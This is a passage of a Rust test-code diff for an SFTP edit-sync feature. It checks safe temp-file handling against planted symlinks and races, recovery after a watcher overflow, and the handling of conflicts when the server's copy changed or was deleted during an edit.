+    /// someone's regular file in a shared folder. The save used to open it with
+    /// CREATE|TRUNCATE (writing THROUGH the link into its target, or truncating
+    /// the file), then delete the real file and rename the link into its place.
+    /// Now it refuses cleanly and touches none of the three.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_fix1_an_edit_save_never_writes_through_a_planted_temp_file() {
+        for planted_link in [true, false] {
+            let (sftp, fx) = crate::sftp::testkit::serve().await;
+            fx.write("/srv/report.txt", b"original");
+            fx.write("/srv/victim", b"victim data");
+            let tmp = "/srv/report.txt.sshspan-tmp-fixed";
+            if planted_link {
+                fx.symlink("victim", tmp);
+            } else {
+                fx.write(tmp, b"someone else's file");
+            }
+            let local = LocalDir::new();
+            let staged = local.0.join("staged.txt");
+            std::fs::write(&staged, b"my edit").unwrap();
+
+            let err = upload_edited_file_as(&sftp, &staged, "/srv/report.txt", None, tmp)
+                .await
+                .expect_err("something is in the way");
+
+            assert!(err.contains("in the way"), "link={planted_link}: {err}");
+            assert_eq!(fx.read("/srv/report.txt"), b"original");
+            assert_eq!(kind_of(&fx, "/srv/report.txt"), "file");
+            assert_eq!(fx.read("/srv/victim"), b"victim data");
+            if planted_link {
+                assert_eq!(kind_of(&fx, tmp), "link");
+            } else {
+                assert_eq!(fx.read(tmp), b"someone else's file");
+            }
+        }
+    }
+
+    /// The temp file swapped for a link between our CLOSE and our RENAME (same
+    /// size, so a size check alone does not notice): it is not renamed into the
+    /// real file's place.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_fix1_an_edit_temp_swapped_for_a_link_is_not_renamed_into_place() {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.write("/srv/report.txt", b"original");
+        fx.write("/srv/victim", b"VICTIM!");
+        let tmp = "/srv/report.txt.sshspan-tmp-fixed";
+        fx.knobs.lock().unwrap().swap_for_link_on_close = Some((tmp.into(), "victim".into()));
+        let local = LocalDir::new();
+        let staged = local.0.join("staged.txt");
+        std::fs::write(&staged, b"my edit").unwrap();
+
+        let err = upload_edited_file_as(&sftp, &staged, "/srv/report.txt", None, tmp)
+            .await
+            .expect_err("the temp file is no longer ours");
+
+        assert!(err.contains("not a regular file"), "{err}");
+        assert_eq!(fx.read("/srv/report.txt"), b"original");
+        assert_eq!(kind_of(&fx, "/srv/report.txt"), "file");
+        assert_eq!(fx.read("/srv/victim"), b"VICTIM!");
+    }
+
+    /// Each save uses a fresh, unguessable temp name next to the target, so
+    /// nothing can be planted for it in advance.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_fix1_edit_temp_names_are_fresh_and_unguessable() {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.write("/srv/app.conf", b"v0");
+        let local = LocalDir::new();
+        let staged = local.0.join("staged.conf");
+        for content in [&b"v1"[..], b"v2, longer"] {
+            std::fs::write(&staged, content).unwrap();
+            upload_edited_file(&sftp, &staged, "/srv/app.conf", None)
+                .await
+                .unwrap();
+        }
+        let temps: Vec<String> = fx
+            .ops()
+            .iter()
+            .filter_map(|op| op.strip_prefix("open "))
+            .filter_map(|rest| rest.split(' ').next())
+            .filter(|path| path.contains(EDIT_TMP_SUFFIX))
+            .map(str::to_string)
+            .collect();
+        assert_eq!(temps.len(), 2, "{:?}", fx.ops());
+        assert_ne!(temps[0], temps[1], "a predictable name can be planted");
+        for t in &temps {
+            let random = t
+                .strip_prefix("/srv/app.conf.sshspan-tmp-")
+                .unwrap_or_else(|| panic!("{t}"));
+            assert!(
+                random.len() >= 16 && random.chars().all(|c| c.is_ascii_hexdigit()),
+                "{t}"
+            );
+        }
+        assert_eq!(fx.read("/srv/app.conf"), b"v2, longer");
+    }
+
+    // ─── RU6a item 6: the remote temp file of a failed edit upload ───────────
+
+    /// A server on Windows (Win32-OpenSSH) will not delete a file that is
+    /// still open. A failed upload deleted its temp file while our handle
+    /// was still open, so the cleanup failed there and the temp file stayed.
+    /// The handle is closed first.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_a_failed_edit_upload_closes_its_temp_file_before_deleting_it() {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.write("/srv/app.conf", b"precious original");
+        {
+            let mut knobs = fx.knobs.lock().unwrap();
+            knobs.write_fail_at = Some(0);
+            knobs.refuse_remove_open = true;
+        }
+        let local = LocalDir::new();
+        let staged = local.0.join("staged.conf");
+        std::fs::write(&staged, vec![b'x'; 100_000]).unwrap();
+
+        let err = upload_edited_file(&sftp, &staged, "/srv/app.conf", None)
+            .await
+            .expect_err("the write is refused");
+
+        let tmp = opened_temp(&fx);
+        assert!(
+            temps_in(&fx, "/srv").is_empty(),
+            "temp file left behind: {err} {:?}",
+            fx.ops()
+        );
+        assert!(!err.contains("left at"), "{err}");
+        let ops = fx.ops();
+        let closed = ops.iter().position(|op| op == &format!("close {tmp}"));
+        let removed = ops.iter().rposition(|op| op == &format!("remove {tmp}"));
+        assert!(
+            matches!((closed, removed), (Some(c), Some(r)) if c < r),
+            "close must come before the delete: {ops:?}"
+        );
+        assert_eq!(fx.read("/srv/app.conf"), b"precious original");
+    }
+
+    /// One retry for a temp file another process briefly holds; a lasting
+    /// refusal still names the leftover (see the test above it).
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_deleting_the_temp_file_of_a_failed_edit_upload_is_retried_once() {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.write("/srv/app.conf", b"precious original");
+        {
+            let mut knobs = fx.knobs.lock().unwrap();
+            knobs.write_fail_at = Some(0);
+            knobs.remove_refusals_left = 1;
+        }
+        let local = LocalDir::new();
+        let staged = local.0.join("staged.conf");
+        std::fs::write(&staged, vec![b'x'; 100_000]).unwrap();
+
+        let err = upload_edited_file(&sftp, &staged, "/srv/app.conf", None)
+            .await
+            .expect_err("the write is refused");
+
+        assert!(temps_in(&fx, "/srv").is_empty(), "{err}");
+        assert!(!err.contains("left at"), "{err}");
+        let removes = fx
+            .ops()
+            .iter()
+            .filter(|op| op.starts_with("remove "))
+            .count();
+        assert_eq!(removes, 2, "{:?}", fx.ops());
     }
 
     // ─── edit and sync back (A7-19) ──────────────────────────────────────────
@@ -4852,38 +7501,103 @@ mod tests {
 
     /// A notify error used to be dropped on the floor (`let Ok(event) = res
     /// else { return }`): a watcher that died looked exactly like "no saves".
+    /// (A queue overflow is NOT such an error in notify 7 - see
+    /// `ru6a_a_watcher_overflow_is_a_rescan_not_an_error`.)
     #[test]
     fn watcher_errors_are_surfaced_not_swallowed() {
         use notify::event::{CreateKind, EventKind};
         let staged = std::ffi::OsStr::new("a.txt");
 
         let err = watch_verdict(
-            Err(notify::Error::generic("inotify queue overflow")),
+            Err(notify::Error::generic("the watched folder was removed")),
             staged,
         )
         .expect_err("a watcher error must reach the caller");
-        assert!(err.contains("inotify queue overflow"), "{err}");
+        assert!(err.contains("the watched folder was removed"), "{err}");
 
         let save = watch_event(EventKind::Create(CreateKind::File), &["/d/a.txt"]);
-        assert_eq!(watch_verdict(Ok(save), staged), Ok(true));
+        assert_eq!(watch_verdict(Ok(save), staged), Ok(WatchVerdict::Save));
         let other = watch_event(EventKind::Create(CreateKind::File), &["/d/b.txt"]);
-        assert_eq!(watch_verdict(Ok(other), staged), Ok(false));
+        assert_eq!(
+            watch_verdict(Ok(other), staged),
+            Ok(WatchVerdict::Unrelated)
+        );
     }
 
+    /// RU6a item 12: the event names its edit session, and a conflict says
+    /// what the server holds now.
     #[test]
-    fn edit_sync_events_report_success_and_failure() {
-        let ok = edit_sync_event("sess", "/etc/app.conf", &Ok(42));
+    fn edit_sync_events_report_success_failure_conflict_and_reload() {
+        let event = |outcome| edit_sync_event("sess", "edit-1", "/etc/app.conf", &outcome);
+        let base = |fields: serde_json::Value| {
+            let mut v = serde_json::json!({
+                "sessionId": "sess", "editId": "edit-1", "remote": "/etc/app.conf",
+            });
+            v.as_object_mut()
+                .unwrap()
+                .extend(fields.as_object().unwrap().clone());
+            v
+        };
         assert_eq!(
-            ok,
-            serde_json::json!({ "sessionId": "sess", "remote": "/etc/app.conf", "ok": true })
+            event(SyncOutcome::Uploaded),
+            base(serde_json::json!({ "ok": true }))
         );
-        let failed = edit_sync_event("sess", "/etc/app.conf", &Err("upload failed: boom".into()));
         assert_eq!(
-            failed,
-            serde_json::json!({
-                "sessionId": "sess", "remote": "/etc/app.conf",
-                "ok": false, "error": "upload failed: boom",
-            })
+            event(SyncOutcome::Failed("upload failed: boom".into())),
+            base(serde_json::json!({ "ok": false, "error": "upload failed: boom" }))
+        );
+        let conflict = |reason, remote| SyncOutcome::Conflict {
+            name: "app.conf".into(),
+            conflict: PendingConflict {
+                id: "c-1".into(),
+                local: String::new(),
+                reason,
+                remote,
+                remote_sha256: None,
+            },
+        };
+        let stamp = RemoteStamp {
+            size: Some(12),
+            mtime: Some(1_700_000_000),
+        };
+        assert_eq!(
+            event(conflict(ConflictReason::Changed, stamp)),
+            base(serde_json::json!({
+                "ok": false,
+                "conflict": true,
+                "conflictId": "c-1",
+                "reason": "changed",
+                "error": "app.conf changed on the server since you opened it - choose Overwrite or Reload.",
+                "remoteSize": 12,
+                "remoteModifiedMs": 1_700_000_000_000i64,
+            }))
+        );
+        assert_eq!(
+            event(conflict(ConflictReason::Deleted, RemoteStamp::default())),
+            base(serde_json::json!({
+                "ok": false,
+                "conflict": true,
+                "conflictId": "c-1",
+                "reason": "deleted",
+                "error": "app.conf was deleted on the server since you opened it - choose Overwrite to put your copy back, or close it.",
+                "remoteSize": null,
+                "remoteModifiedMs": null,
+            }))
+        );
+        let unverifiable = event(conflict(
+            ConflictReason::Unverifiable,
+            RemoteStamp::default(),
+        ));
+        assert_eq!(unverifiable["reason"], "unverifiable");
+        assert!(
+            unverifiable["error"]
+                .as_str()
+                .is_some_and(|e| e.contains("cannot tell whether app.conf changed")),
+            "{unverifiable}"
+        );
+        assert_eq!(
+            event(SyncOutcome::Reloaded),
+            base(serde_json::json!({ "ok": true, "reloaded": true }))
         );
     }
 
@@ -4916,29 +7630,121 @@ mod tests {
         assert!(debounce.settle().await.is_some());
     }
 
-    /// An `EditSync` over `sftp` writing `target`, events collected in the list.
+    /// An `EditSync` over `sftp` writing `target`, events collected in the
+    /// list - set up the way `sftp_open_for_edit` leaves one: the baseline is
+    /// the remote file as it is now, and the server is taken to hold what
+    /// `synced_content` hashes to (`None`: unknown).
     #[cfg(unix)]
-    fn edit_sync(
+    async fn edit_sync_with(
+        sftp: russh_sftp::client::SftpSession,
+        local: &std::path::Path,
+        target: &str,
+        mode: Option<u32>,
+        synced_content: Option<&[u8]>,
+    ) -> (Arc<EditSync>, Arc<std::sync::Mutex<Vec<serde_json::Value>>>) {
+        use sha2::{Digest, Sha256};
+        let events = Arc::new(std::sync::Mutex::new(Vec::new()));
+        let sink = events.clone();
+        let baseline = sftp
+            .metadata(target)
+            .await
+            .map(|md| RemoteStamp::of(&md))
+            .unwrap_or_default();
+        let synced = synced_content.map(|c| format!("{:x}", Sha256::digest(c)));
+        let sync = Arc::new(EditSync {
+            sftp: Arc::new(sftp),
+            session_id: "sess".into(),
+            edit_id: "edit-1".into(),
+            remote: "/link.conf".into(),
+            target: target.into(),
+            staged: crate::sftp::StagedCopy::new(local.to_path_buf()),
+            mode,
+            emit: Arc::new(move |payload| sink.lock().unwrap().push(payload)),
+            stopped: std::sync::atomic::AtomicBool::new(false),
+            debounce: EditDebounce::new(std::time::Duration::from_millis(80)),
+            upload_lock: tokio::sync::Mutex::new(()),
+            baseline: std::sync::Mutex::new(baseline),
+            synced: std::sync::Mutex::new(synced),
+            pending: std::sync::Mutex::new(None),
+            retry: SyncRetry::default(),
+        });
+        (sync, events)
+    }
+
+    /// A hook run inside a Reload, and the edit id it is for.
+    type ReloadHook = (String, Box<dyn FnOnce() + Send>);
+
+    /// Hooks run inside a Reload right after its download (see
+    /// `EditSync::resolve`), keyed by edit id: a test lands an "editor save"
+    /// in exactly that window.
+    static RELOAD_HOOKS: std::sync::Mutex<Vec<ReloadHook>> = std::sync::Mutex::new(Vec::new());
+
+    thread_local! {
+        /// Path resolutions (`canonical`, `system_path`) on this thread: the
+        /// tests run in parallel, so each counts only its own.
+        static RESOLUTIONS: std::cell::Cell<usize> = const { std::cell::Cell::new(0) };
+    }
+
+    pub(super) fn count_resolution() {
+        RESOLUTIONS.with(|n| n.set(n.get() + 1));
+    }
+
+    #[cfg(unix)]
+    fn reset_resolutions() {
+        RESOLUTIONS.with(|n| n.set(0));
+    }
+
+    #[cfg(unix)]
+    fn resolutions() -> usize {
+        RESOLUTIONS.with(|n| n.get())
+    }
+
+    /// `(local path, step)` as `download_to_hashed` reaches them ("fsync" once
+    /// the staged copy is on disk, "rename" just before it replaces `local`).
+    static DOWNLOAD_STEPS: std::sync::Mutex<Vec<(String, &'static str)>> =
+        std::sync::Mutex::new(Vec::new());
+
+    pub(super) fn note_download_step(local: &str, step: &'static str) {
+        DOWNLOAD_STEPS
+            .lock()
+            .unwrap()
+            .push((local.to_string(), step));
+    }
+
+    /// The steps recorded for downloads into `local`, in order.
+    #[cfg(unix)]
+    fn download_steps(local: &str) -> Vec<&'static str> {
+        DOWNLOAD_STEPS
+            .lock()
+            .unwrap()
+            .iter()
+            .filter(|(path, _)| path == local)
+            .map(|(_, step)| *step)
+            .collect()
+    }
+
+    pub(super) fn run_reload_hook(edit_id: &str) {
+        let hook = {
+            let mut hooks = RELOAD_HOOKS.lock().unwrap();
+            hooks
+                .iter()
+                .position(|(id, _)| id == edit_id)
+                .map(|i| hooks.remove(i).1)
+        };
+        if let Some(hook) = hook {
+            hook();
+        }
+    }
+
+    /// [`edit_sync_with`] for a session that knows nothing about the content.
+    #[cfg(unix)]
+    async fn edit_sync(
         sftp: russh_sftp::client::SftpSession,
         local: &std::path::Path,
         target: &str,
         mode: Option<u32>,
     ) -> (Arc<EditSync>, Arc<std::sync::Mutex<Vec<serde_json::Value>>>) {
-        let events = Arc::new(std::sync::Mutex::new(Vec::new()));
-        let sink = events.clone();
-        let sync = Arc::new(EditSync {
-            sftp: Arc::new(sftp),
-            session_id: "sess".into(),
-            remote: "/link.conf".into(),
-            target: target.into(),
-            local: local.to_path_buf(),
-            mode,
-            emit: Arc::new(move |payload| sink.lock().unwrap().push(payload)),
-            stopped: Arc::new(std::sync::atomic::AtomicBool::new(false)),
-            debounce: EditDebounce::new(std::time::Duration::from_millis(80)),
-            upload_lock: tokio::sync::Mutex::new(()),
-        });
-        (sync, events)
+        edit_sync_with(sftp, local, target, mode, None).await
     }
 
     #[cfg(unix)]
@@ -4967,21 +7773,19 @@ mod tests {
         let staged = local.0.join("staged.sh");
         std::fs::write(&staged, b"#!/bin/sh\necho new\n").unwrap();
 
-        let bytes = upload_edited_file(&sftp, &staged, "/srv/deploy.sh", Some(0o750))
+        let up = upload_edited_file(&sftp, &staged, "/srv/deploy.sh", Some(0o750))
             .await
             .expect("upload");
 
-        assert_eq!(bytes, 19);
+        assert_eq!(up.bytes, 19);
+        assert_eq!(up.stamp.size, Some(19), "the new file's own stamp");
         assert_eq!(fx.read("/srv/deploy.sh"), b"#!/bin/sh\necho new\n");
         assert_eq!(
             fx.mode("/srv/deploy.sh"),
             0o750,
             "executable bit must survive"
         );
-        assert!(
-            !fx.exists("/srv/deploy.sh.sshspan-tmp"),
-            "no temp file left behind"
-        );
+        assert!(temps_in(&fx, "/srv").is_empty(), "no temp file left behind");
         let ops = fx.ops();
         assert!(
             ops[0].starts_with("open /srv/deploy.sh.sshspan-tmp"),
@@ -5013,7 +7817,7 @@ mod tests {
         assert!(!err.is_empty());
         assert_eq!(fx.read("/srv/app.conf"), b"precious original");
         assert!(
-            !fx.exists("/srv/app.conf.sshspan-tmp"),
+            temps_in(&fx, "/srv").is_empty(),
             "partial temp file removed"
         );
         // The cleanup worked, so the message must not claim otherwise.
@@ -5040,14 +7844,12 @@ mod tests {
             .await
             .expect_err("the write is refused");
 
+        let tmp = opened_temp(&fx);
         assert!(
-            err.contains("temp file left at /srv/app.conf.sshspan-tmp"),
+            err.contains(&format!("temp file left at {tmp}")),
             "the error must say where the leftover is: {err}"
         );
-        assert!(
-            fx.exists("/srv/app.conf.sshspan-tmp"),
-            "it really was left behind"
-        );
+        assert!(fx.exists(&tmp), "it really was left behind");
         assert_eq!(fx.read("/srv/app.conf"), b"precious original");
     }
 
@@ -5089,7 +7891,7 @@ mod tests {
         let local = LocalDir::new();
         let staged = local.0.join("staged.conf");
         std::fs::write(&staged, b"edited").unwrap();
-        let (sync, events) = edit_sync(sftp, &staged, "/srv/app.conf", None);
+        let (sync, events) = edit_sync(sftp, &staged, "/srv/app.conf", None).await;
 
         let tasks: Vec<_> = (0..4)
             .map(|_| tokio::spawn(sync.clone().on_change()))
@@ -5122,7 +7924,7 @@ mod tests {
         let local = LocalDir::new();
         let staged = local.0.join("staged.conf");
         std::fs::write(&staged, vec![b'y'; 50_000]).unwrap();
-        let (sync, events) = edit_sync(sftp, &staged, "/srv/app.conf", None);
+        let (sync, events) = edit_sync(sftp, &staged, "/srv/app.conf", None).await;
 
         sync.clone().on_change().await;
 
@@ -5146,7 +7948,7 @@ mod tests {
         let local = LocalDir::new();
         let staged = local.0.join("staged.conf");
         std::fs::write(&staged, b"edited").unwrap();
-        let (sync, events) = edit_sync(sftp, &staged, "/srv/app.conf", None);
+        let (sync, events) = edit_sync(sftp, &staged, "/srv/app.conf", None).await;
         sync.stopped.store(true, Ordering::SeqCst);
 
         sync.clone().on_change().await;
@@ -5154,6 +7956,655 @@ mod tests {
         assert_eq!(tmp_opens(&fx), 0);
         assert!(events.lock().unwrap().is_empty());
         assert_eq!(fx.read("/srv/app.conf"), b"old");
+    }
+
+    // ─── RU6a item 5: a watcher overflow is a rescan ─────────────────────────
+
+    /// notify 7 reports a queue overflow as an EVENT carrying the Rescan flag
+    /// (`Ok`, not `Err`), and the old code took it for an unrelated event: a
+    /// save whose events were lost in the overflow was never uploaded.
+    #[test]
+    fn ru6a_a_watcher_overflow_is_a_rescan_not_an_error() {
+        use notify::event::{EventKind, Flag};
+        let staged = std::ffi::OsStr::new("a.txt");
+        let overflow = notify::Event::new(EventKind::Other).set_flag(Flag::Rescan);
+        assert!(overflow.need_rescan());
+        assert_eq!(
+            watch_verdict(Ok(overflow), staged),
+            Ok(WatchVerdict::Rescan)
+        );
+        // A rescan notice that names some other path is a rescan all the same.
+        let named = watch_event(EventKind::Any, &["/d/other.txt"]).set_flag(Flag::Rescan);
+        assert_eq!(watch_verdict(Ok(named), staged), Ok(WatchVerdict::Rescan));
+    }
+
+    /// The save's own events were lost in the overflow; the rescan finds the
+    /// staged file differs from what the server holds, and syncs it.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_a_save_lost_to_a_watcher_overflow_still_syncs() {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.write("/srv/app.conf", b"original");
+        let local = LocalDir::new();
+        let staged = local.0.join("staged.conf");
+        std::fs::write(&staged, b"edited while the watcher overflowed").unwrap();
+        let (sync, events) =
+            edit_sync_with(sftp, &staged, "/srv/app.conf", None, Some(b"original")).await;
+
+        sync.clone().react(WatchVerdict::Rescan).await;
+
+        assert_eq!(
+            fx.read("/srv/app.conf"),
+            b"edited while the watcher overflowed"
+        );
+        let events = events.lock().unwrap();
+        assert_eq!(events.len(), 1, "{events:?}");
+        assert_eq!(events[0]["ok"], true);
+    }
+
+    /// ...and a rescan that finds nothing changed uploads nothing.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_a_rescan_with_nothing_changed_uploads_nothing() {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.write("/srv/app.conf", b"same");
+        let local = LocalDir::new();
+        let staged = local.0.join("staged.conf");
+        std::fs::write(&staged, b"same").unwrap();
+        let (sync, events) =
+            edit_sync_with(sftp, &staged, "/srv/app.conf", None, Some(b"same")).await;
+
+        sync.clone().react(WatchVerdict::Rescan).await;
+
+        assert_eq!(tmp_opens(&fx), 0, "{:?}", fx.ops());
+        assert!(events.lock().unwrap().is_empty());
+    }
+
+    // ─── RU6a item 12: a remote change since the download is a conflict ──────
+
+    /// An edit session opened on `v1`, then the server's copy changed by
+    /// someone else and the local copy edited: (sync, events, fixture, the
+    /// scratch dir, the staged path).
+    #[cfg(unix)]
+    async fn conflicted_edit() -> (
+        Arc<EditSync>,
+        Arc<std::sync::Mutex<Vec<serde_json::Value>>>,
+        crate::sftp::testkit::Fixture,
+        LocalDir,
+        PathBuf,
+    ) {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.write("/srv/app.conf", b"v1");
+        let local = LocalDir::new();
+        let staged = local.0.join("staged.conf");
+        std::fs::write(&staged, b"v1").unwrap();
+        let (sync, events) =
+            edit_sync_with(sftp, &staged, "/srv/app.conf", None, Some(b"v1")).await;
+        fx.write("/srv/app.conf", b"v2, changed by someone else");
+        std::fs::write(&staged, b"my edit").unwrap();
+        (sync, events, fx, local, staged)
+    }
+
+    /// The next local save used to overwrite the other person's change
+    /// without a word. It is a conflict now: nothing is uploaded, and the
+    /// event says what the server holds.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_a_remote_change_since_the_download_is_a_conflict_not_an_overwrite() {
+        let (sync, events, fx, _local, _staged) = conflicted_edit().await;
+
+        sync.clone().on_change().await;
+
+        assert_eq!(
+            fx.read("/srv/app.conf"),
+            b"v2, changed by someone else",
+            "the other change was overwritten"
+        );
+        assert_eq!(tmp_opens(&fx), 0, "{:?}", fx.ops());
+        let events = events.lock().unwrap();
+        assert_eq!(events.len(), 1, "{events:?}");
+        let e = &events[0];
+        assert_eq!(
+            (e["ok"].as_bool(), e["conflict"].as_bool()),
+            (Some(false), Some(true)),
+            "{e}"
+        );
+        assert_eq!(e["editId"], "edit-1");
+        assert_eq!(e["remoteSize"], 27);
+        assert!(e["remoteModifiedMs"].as_i64().is_some(), "{e}");
+        assert_eq!(
+            e["error"],
+            "link.conf changed on the server since you opened it - choose Overwrite or Reload."
+        );
+    }
+
+    /// "Overwrite" uploads the local copy over the server's version, and the
+    /// session agrees with the server again: the next save goes straight in.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_overwrite_uploads_the_local_copy_and_takes_the_new_baseline() {
+        let (sync, events, fx, _local, staged) = conflicted_edit().await;
+        sync.clone().on_change().await;
+        let id = conflict_id(&events);
+
+        let result = sync
+            .clone()
+            .resolve(&id, EditResolution::Overwrite)
+            .await
+            .expect("overwrite");
+
+        assert_eq!(result["action"], "overwrite", "{result}");
+        assert_eq!(fx.read("/srv/app.conf"), b"my edit");
+        std::fs::write(&staged, b"my second edit").unwrap();
+        sync.clone().on_change().await;
+        assert_eq!(
+            fx.read("/srv/app.conf"),
+            b"my second edit",
+            "no conflict with our own upload"
+        );
+        let kinds: Vec<(Option<bool>, Option<bool>)> = events
+            .lock()
+            .unwrap()
+            .iter()
+            .map(|e| (e["ok"].as_bool(), e["conflict"].as_bool()))
+            .collect();
+        assert_eq!(
+            kinds,
+            vec![
+                (Some(false), Some(true)),
+                (Some(true), None),
+                (Some(true), None)
+            ]
+        );
+    }
+
+    /// "Reload" replaces the local copy with the server's version - and that
+    /// rewrite of the staged file is not uploaded back as if it were a save.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_reload_replaces_the_local_copy_and_does_not_upload_it_back() {
+        let (sync, events, fx, _local, staged) = conflicted_edit().await;
+        sync.clone().on_change().await;
+        let id = conflict_id(&events);
+
+        let result = sync
+            .clone()
+            .resolve(&id, EditResolution::Reload)
+            .await
+            .expect("reload");
+
+        assert_eq!(result["action"], "reload", "{result}");
+        assert_eq!(
+            std::fs::read(&staged).unwrap(),
+            b"v2, changed by someone else"
+        );
+        // The watcher sees the reload rewrite the staged file: nothing to send.
+        sync.clone().on_change().await;
+        assert_eq!(tmp_opens(&fx), 0, "{:?}", fx.ops());
+        // A real edit after the reload syncs without a conflict.
+        std::fs::write(&staged, b"edited after the reload").unwrap();
+        sync.clone().on_change().await;
+        assert_eq!(fx.read("/srv/app.conf"), b"edited after the reload");
+        let events = events.lock().unwrap();
+        assert_eq!(events.len(), 3, "{events:?}");
+        assert_eq!(events[0]["conflict"], true);
+        assert_eq!(
+            (events[1]["ok"].as_bool(), events[1]["reloaded"].as_bool()),
+            (Some(true), Some(true))
+        );
+        assert_eq!(events[2]["ok"], true);
+    }
+
+    /// The `conflictId` of the newest conflict event.
+    #[cfg(unix)]
+    fn conflict_id(events: &Arc<std::sync::Mutex<Vec<serde_json::Value>>>) -> String {
+        events
+            .lock()
+            .unwrap()
+            .iter()
+            .rev()
+            .find(|e| e["conflict"] == true)
+            .and_then(|e| e["conflictId"].as_str())
+            .map(str::to_string)
+            .expect("a conflict event with an id")
+    }
+
+    // ─── RU6a fix 1, item 3: resolve needs a pending conflict ────────────────
+
+    /// Overwrite/Reload used to be accepted with no conflict reported at all:
+    /// a resolve is refused unless it names the conflict that is pending.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_fix1_resolve_is_refused_without_a_pending_conflict() {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.write("/srv/app.conf", b"v1");
+        let local = LocalDir::new();
+        let staged = local.0.join("staged.conf");
+        std::fs::write(&staged, b"local edit").unwrap();
+        let (sync, _events) =
+            edit_sync_with(sftp, &staged, "/srv/app.conf", None, Some(b"v1")).await;
+
+        for action in [EditResolution::Overwrite, EditResolution::Reload] {
+            let err = sync
+                .clone()
+                .resolve("made-up", action)
+                .await
+                .expect_err("nothing to resolve");
+            assert_eq!(err, "There is no conflict to resolve for this file.");
+        }
+        assert_eq!(fx.read("/srv/app.conf"), b"v1");
+        assert_eq!(std::fs::read(&staged).unwrap(), b"local edit");
+    }
+
+    /// The proven scenario: the event showed Bob's v2, Bob saved v3, and
+    /// Alice's Overwrite then replaced v3 without a word. The Overwrite checks
+    /// the server again and reports a FRESH conflict instead.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_fix1_overwrite_after_another_remote_change_reports_a_fresh_conflict() {
+        let (sync, events, fx, _local, _staged) = conflicted_edit().await;
+        sync.clone().on_change().await;
+        let first = conflict_id(&events);
+        fx.write("/srv/app.conf", b"v3 - Bob saved again, longer");
+
+        let result = sync
+            .clone()
+            .resolve(&first, EditResolution::Overwrite)
+            .await
+            .expect("a fresh conflict is a result, not an error");
+
+        assert_eq!(fx.read("/srv/app.conf"), b"v3 - Bob saved again, longer");
+        assert_eq!(result["ok"], false, "{result}");
+        assert_eq!(result["conflict"], true, "{result}");
+        let second = conflict_id(&events);
+        assert_ne!(second, first, "a new conflict, a new id");
+        assert_eq!(result["conflictId"], second.as_str(), "{result}");
+        assert_eq!(result["remoteSize"], 28, "{result}");
+        // The old id is spent; the new one works.
+        assert_eq!(
+            sync.clone()
+                .resolve(&first, EditResolution::Overwrite)
+                .await
+                .expect_err("stale id"),
+            "That conflict was replaced by a newer one - choose again on the newest message."
+        );
+        sync.clone()
+            .resolve(&second, EditResolution::Overwrite)
+            .await
+            .expect("overwrite");
+        assert_eq!(fx.read("/srv/app.conf"), b"my edit");
+        // Resolved: nothing pending any more.
+        assert!(sync
+            .clone()
+            .resolve(&second, EditResolution::Reload)
+            .await
+            .is_err());
+    }
+
+    // ─── RU6a fix 1, item 4: a file deleted on the server while edited ──────
+
+    /// Every save used to report "Could not check ... No such file ... Save
+    /// again to retry" - forever. It is a conflict ("deleted"), and Overwrite
+    /// puts the copy back.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_fix1_a_file_deleted_on_the_server_is_a_conflict_that_overwrite_resolves() {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.write("/srv/app.conf", b"v1");
+        let local = LocalDir::new();
+        let staged = local.0.join("staged.conf");
+        std::fs::write(&staged, b"v1").unwrap();
+        let (sync, events) =
+            edit_sync_with(sftp, &staged, "/srv/app.conf", None, Some(b"v1")).await;
+        std::fs::remove_file(fx.path("/srv/app.conf")).unwrap();
+        std::fs::write(&staged, b"my edit").unwrap();
+
+        sync.clone().on_change().await;
+
+        let e = events.lock().unwrap().last().cloned().unwrap();
+        assert_eq!(e["conflict"], true, "{e}");
+        assert_eq!(e["reason"], "deleted", "{e}");
+        assert!(
+            e["remoteSize"].is_null() && e["remoteModifiedMs"].is_null(),
+            "{e}"
+        );
+        assert!(!fx.exists("/srv/app.conf"));
+        let id = conflict_id(&events);
+        let err = sync
+            .clone()
+            .resolve(&id, EditResolution::Reload)
+            .await
+            .expect_err("nothing to reload");
+        assert!(err.contains("deleted on the server"), "{err}");
+        sync.clone()
+            .resolve(&id, EditResolution::Overwrite)
+            .await
+            .expect("overwrite puts it back");
+        assert_eq!(fx.read("/srv/app.conf"), b"my edit");
+    }
+
+    // ─── RU6a fix 1, item 5: Reload records the bytes it downloaded ─────────
+
+    /// An editor save landing right after Reload's rename was hashed as if it
+    /// were the server's content - recorded as synced, never uploaded.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_fix1_an_editor_save_during_reload_is_still_uploaded() {
+        let (sync, events, fx, _local, staged) = conflicted_edit().await;
+        sync.clone().on_change().await;
+        let id = conflict_id(&events);
+        let saved_meanwhile = staged.clone();
+        RELOAD_HOOKS.lock().unwrap().push((
+            "edit-1".to_string(),
+            Box::new(move || std::fs::write(&saved_meanwhile, b"typed during the reload").unwrap()),
+        ));
+
+        sync.clone()
+            .resolve(&id, EditResolution::Reload)
+            .await
+            .expect("reload");
+        sync.clone().on_change().await;
+
+        assert_eq!(fx.read("/srv/app.conf"), b"typed during the reload");
+    }
+
+    // ─── RU6a fix 1, item 6: the open-time baseline ──────────────────────────
+
+    /// The baseline came from a separate STAT whose failure was swallowed
